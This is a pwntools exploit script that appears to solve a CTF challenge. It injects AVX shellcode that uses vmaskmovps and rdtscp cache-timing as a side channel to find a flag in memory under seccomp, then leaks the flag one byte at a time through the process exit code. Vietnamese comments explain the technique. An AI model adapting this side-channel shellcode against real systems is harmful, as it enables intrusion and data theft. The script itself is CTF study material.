#!/usr/bin/python3
from pwn import * 

exe = ELF('./prob', checksec=False)
#libc = ELF('./libc', checksec=False)
context.binary  = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x000000000000155D
		c
		''')

def start():
	if args.REMOTE:
		s = ssh(host='challenges2.ctf.sd', user='hacker', password='hacker', port=34942)
		return s.process(['./prob'])
	else:
		return process(exe.path)

# Egg hunter -> find address flag
# Sử dụng AVX instructions để viết shellcode
	# Cách kiểm tra sự tồn tại của địa chỉ khi tất cả các syscall bị seccomp
	# Lệnh vmaskmvps: đọc bộ nhớ dựa trên mask của thanh ghi 
		# nếu bit cao nhất của mask là 1 => đọc dữ liệu và gho
		# Ngược lại => Đọc dữ liệu và không ghi vào src
			# Dựa vào đó ta có thể đọc bô nhớ của địa chỉ
				# Nếu địa chỉ không tồn tại thì CPU sẽ tìm trong RAM và ngược lại sẽ tìm trong cache
				# Điều này có sự khác biệt về tốc độ giữa RAM và Cache
			 	# Dựa vào đó ta có thể biết địa chỉ đó có tồn tại hay không
	# rdtsc (khác với rtdscp): Đây là lệnh quan trong nhất dùng để đo chu kỳ CPU (kết quả ở EDX (thấp) và EAX (cao))
	# mfencen : Bắt CPU phải thực thi lệnh theo thứ tự
	# vpxor : Gần giống xor
# Side channel attack timing ()

# CPU sẽ ưu tiên đọc data từ cache nếu data đó không tồn tại nó sẽ chuyển sang RAM để đọc
# Tốc độ sẽ có sự khác biệt khi đọc từ cache và RAM 
# Lợi dụng điều đó, attacker sẽ đo tốc độ phản hồi từ bộ nhớ để biết địa chỉ đó có tồn tại không
# Nếu tồn tại thì tốc độ phản hồi của CPU có xu hướng nhỏ hơn một mức nhất định 

#GDB()
#input()
#0xL4ugh{Shout
Flag = ""
Count = len(Flag)
while (True):
	try:
		p = start()

		pld = asm(f'''
			mov rsi, 0x13370000
		flag_addr:
			add rsi, 0x10000

			vpxor ymm0, ymm0, ymm0
			
			vmaskmovps ymm0, ymm0, ymmword ptr [rsi]

			mfence
			rdtscp
			shl rdx, 32
			or rax, rdx
			mov rbx, rax

			vmaskmovps ymm0, ymm0, ymmword ptr [rsi]

			mfence
			rdtscp
			shl rdx, 32
			or rax, rdx

			sub rax, rbx
			cmp rax, 0x8c
			jg flag_addr

		brute_force:
			add rsi, {Count}
			mov dil, byte ptr [rsi]
			mov rax, 60
			syscall

			''' ,arch='amd64')

		sla(b'up? ', pld)
		output = rl(p)

		if output == b"":
			raise EOFError

	except EOFError:
		flag_char = p.poll()
		print(flag_char)
		if flag_char == -11 or flag_char == None:
			p.close()
			continue
		elif 0 <= flag_char <= 255:
			p.close()
			Flag += chr(flag_char)
			Count += 1
			print(f'Flag : {Flag}')

p.interactive()

#0xL4ugh{flag}	